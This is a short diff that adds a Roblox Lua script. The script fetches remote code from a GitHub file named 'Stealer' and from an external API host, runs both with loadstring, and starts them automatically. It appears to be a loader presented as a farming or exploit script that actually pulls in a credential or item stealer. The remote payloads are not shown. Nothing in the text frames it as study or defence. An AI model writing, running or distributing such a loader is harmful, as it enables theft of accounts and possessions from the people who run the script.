@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/B6O6S/Robloxscripts/refs/heads/main/Stealer'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://api.overdrivehub.xyz/v1/auth'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
